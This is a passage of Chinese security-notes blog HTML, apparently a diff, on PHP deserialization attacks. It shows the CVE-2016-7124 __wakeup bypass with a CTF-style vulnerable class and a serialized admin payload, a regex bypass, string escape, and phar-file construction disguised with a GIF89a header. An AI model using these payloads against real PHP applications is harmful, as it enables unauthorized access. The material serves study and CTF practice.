class=&#34;hljs-built_in&#34;&gt;__clone&lt;/span&gt;()，当对象复制完成时调用&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__autoload&lt;/span&gt;()，尝试加载未定义的类&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;__debugInfo&lt;/span&gt;()，打印所需调试信息&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_45521281/article/details/105891381&#34;&gt;https://blog.csdn.net/qq_45521281/article/details/105891381&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;正则绕过&#34;&gt;&lt;a href=&#34;#正则绕过&#34; class=&#34;headerlink&#34; title=&#34;正则绕过&#34;&gt;&lt;/a&gt;正则绕过&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight mathematica&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs mathematica&#34;&gt;可以使用&lt;span class=&#34;hljs-built_in&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;:+&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;来替换&lt;span class=&#34;hljs-built_in&#34;&gt;O&lt;/span&gt;&lt;span class=&#34;hljs-operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+
+
+&lt;h2 id=&#34;CVE-2016-7124-Wakeup函数绕过&#34;&gt;&lt;a href=&#34;#CVE-2016-7124-Wakeup函数绕过&#34; class=&#34;headerlink&#34; title=&#34;CVE-2016-7124 Wakeup函数绕过&#34;&gt;&lt;/a&gt;CVE-2016-7124 Wakeup函数绕过&lt;/h2&gt;&lt;hr&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// __wakeup()函数，在反序列化时，被自动调用,但当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过 __wakeup 函数的执行&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//PHP5 &amp;lt; 5.6.25， PHP7 &amp;lt; 7.0.10 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//也就是上面的例子中的3改为4，则就会绕过wakeup函数&lt;/span&gt;&lt;br&gt;O:&lt;span class=&#34;hljs-number&#34;&gt;9&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;DemoClass&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;name&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;john&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;sex&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Women&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;age&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;18&#34;&lt;/span&gt;;}&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//其中3&lt;/span&gt;&lt;br&gt;O:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Objt&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;%00Name%00username&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;admin&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;%00Name%00password&#34;&lt;/span&gt;;i:&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;例子：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;Name&lt;/span&gt;&lt;/span&gt;{&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$username&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&#39;nonono&#39;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&#39;yesyes&#39;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$username&lt;/span&gt;,&lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;hljs-variable&#34;&gt;$username&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password = &lt;span class=&#34;hljs-variable&#34;&gt;$password&lt;/span&gt;;&lt;br&gt;    }&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__wakeup&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;hljs-string&#34;&gt;&#39;guest&#39;&lt;/span&gt;;&lt;br&gt;    }&lt;br&gt;    &lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;hljs-params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;{&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password != &lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;) {&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;&amp;lt;/br&amp;gt;NO!!!hacker!!!&amp;lt;/br&amp;gt;&#34;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;You name is: &#34;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;&amp;lt;/br&amp;gt;&#34;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;You password is: &#34;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;&amp;lt;/br&amp;gt;&#34;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;();&lt;br&gt;        }&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username === &lt;span class=&#34;hljs-string&#34;&gt;&#39;admin&#39;&lt;/span&gt;) {&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-variable&#34;&gt;$flag&lt;/span&gt;;&lt;br&gt;        }&lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;{&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&#34;&amp;lt;/br&amp;gt;hello my friend~~&amp;lt;/br&amp;gt;sorry i can&#39;t give you the flag!&#34;&lt;/span&gt;;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;();      &lt;br&gt;        }&lt;br&gt;    }&lt;br&gt;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;Payload：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;O:&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;Objt&#34;&lt;/span&gt;:&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;:{s:&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;%00Name%00username&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;admin&#34;&lt;/span&gt;;s:&lt;span class=&#34;hljs-number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;hljs-string&#34;&gt;&#34;%00Name%00password&#34;&lt;/span&gt;;i:&lt;span class=&#34;hljs-number&#34;&gt;100&lt;/span&gt;;}&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 其中构造%00Name%00表明使用对象的private对象，其等价于Name-&amp;gt;username&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;h3 id=&#34;PHP序列化长度变化导致字符逃逸&#34;&gt;&lt;a href=&#34;#PHP序列化长度变化导致字符逃逸&#34; class=&#34;headerlink&#34; title=&#34;PHP序列化长度变化导致字符逃逸&#34;&gt;&lt;/a&gt;PHP序列化长度变化导致字符逃逸&lt;/h3&gt;&lt;hr&gt;
+&lt;p&gt;PHP反序列化中值的字符读取多少其实是由表示长度的数字控制的&lt;/p&gt;
+&lt;p&gt;只要整个字符串的前一部分能够成功反序列化，这个字符串后面剩下的一部分将会被丢弃&lt;/p&gt;
+&lt;p&gt;如果将对象进行序列化，而后进行改变再进行反序列化，则这个过程中一定存在漏洞&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;=&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#39;O:11:&#34;FileHandler&#34;:3:{s:2:&#34;op&#34;;s:1:&#34;2&#34;;s:8:&#34;filename&#34;;s:8:&#34;flag.php&#34;;s:7:&#34;content&#34;;s:8:&#34;flag.php&#34;;}&#39;&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$s&lt;/span&gt;);&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# 输出---------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;object&lt;/span&gt;(&lt;span class=&#34;hljs-built_in&#34;&gt;__PHP_Incomplete_Class&lt;/span&gt;)&lt;span class=&#34;hljs-comment&#34;&gt;#2 (4) {&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-string&#34;&gt;&#34;__PHP_Incomplete_Class_Name&#34;&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;11&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&#34;FileHandler&#34;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-string&#34;&gt;&#34;op&#34;&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-string&#34;&gt;&#34;filename&#34;&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&#34;flag.php&#34;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-string&#34;&gt;&#34;content&#34;&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&#34;flag.php&#34;&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433031.png&#34; alt=&#34;image-20200723172157626&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;toString-NaN&#34;&gt;&lt;a href=&#34;#toString-NaN&#34; class=&#34;headerlink&#34; title=&#34;__toString()&#34;&gt;&lt;/a&gt;__toString()&lt;/h2&gt;&lt;hr&gt;
+&lt;p&gt;当对对象进行echo和**file_exists()**的时候&lt;/p&gt;
+&lt;h2 id=&#34;phar反序列化利用&#34;&gt;&lt;a href=&#34;#phar反序列化利用&#34; class=&#34;headerlink&#34; title=&#34;phar反序列化利用&#34;&gt;&lt;/a&gt;phar反序列化利用&lt;/h2&gt;&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;条件&lt;/strong&gt;：php.ini中的phar.readonly = Off&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;//示例代码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;//反序列化payload构造&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;TestObject&lt;/span&gt; &lt;/span&gt;{&lt;br&gt;    }&lt;br&gt;    &lt;br&gt;    @&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;unlink&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;phar.phar&#34;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$phar&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;Phar&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;phar.phar&#34;&lt;/span&gt;); &lt;span class=&#34;hljs-comment&#34;&gt;//后缀名必须为phar&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;startBuffering&lt;/span&gt;();&lt;br&gt;    &lt;span class=&#34;hljs-comment&#34;&gt;//设置stub，GIF89a可以改成其他的字段，绕过文件头检验，但必须以 __HALT_COMPILER(); ?&amp;gt; 结尾&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;setStub&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;GIF89a&#34;&lt;/span&gt;.&lt;span class=&#34;hljs-string&#34;&gt;&#34;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&#34;&lt;/span&gt;); &lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;//将反序列化的对象放入该文件中&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$o&lt;/span&gt; = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-title class_&#34;&gt;TestObject&lt;/span&gt;();&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$o&lt;/span&gt;-&amp;gt;data=&lt;span class=&#34;hljs-string&#34;&gt;&#39;just a test&#39;&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;setMetadata&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$o&lt;/span&gt;);&lt;br&gt;&lt;br&gt;	&lt;span class=&#34;hljs-comment&#34;&gt;//phar本质上是个压缩包，所以要添加压缩的文件和文件内容&lt;/span&gt;&lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;addFromString&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&#34;test.txt&#34;&lt;/span&gt;, &lt;span class=&#34;hljs-string&#34;&gt;&#34;test&#34;&lt;/span&gt;); &lt;br&gt;    &lt;span class=&#34;hljs-variable&#34;&gt;$phar&lt;/span&gt;-&amp;gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;stopBuffering&lt;/span&gt;();&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;phar&lt;/code&gt;文件头的识别格式是&lt;code&gt;xxx&lt;/code&gt; +&lt;!--?php  __HALT_COMPILER(); ?--&gt;，只有这样的格式才能被识别为&lt;code&gt;phar&lt;/code&gt;文件&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;img src=&#34;https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202403041433039.png&#34; alt=&#34;image-20200803171031539&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;code&gt;phar&lt;/code&gt;是压缩文件，那么压缩文件的信息就会存在第二段&lt;strong&gt;manifest describing&lt;/strong&gt;，这一段是放序列化的&lt;code&gt;poc&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;phar文件会以序列化的形式存储用户自定义的meta-data，在一些文件操作函数执行的参数可控时，我们在参数部分利用Phar伪协议，可以不依赖unserialize() 直接进行反序列化操作，在读取phar文件里的数据时反序列化meta-data，达到我们的操控目的&lt;/strong&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;压缩的文件的内容被存在第三段，也就是上面payload的中的&lt;code&gt;text.txt&lt;/code&gt;.部分函数在通过&lt;code&gt;phar://&lt;/code&gt;伪协议解析phar文件时，都会将meta-data进行反序列化&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;数字签名为该&lt;code&gt;phar&lt;/code&gt;的第四段&lt;/p&gt;
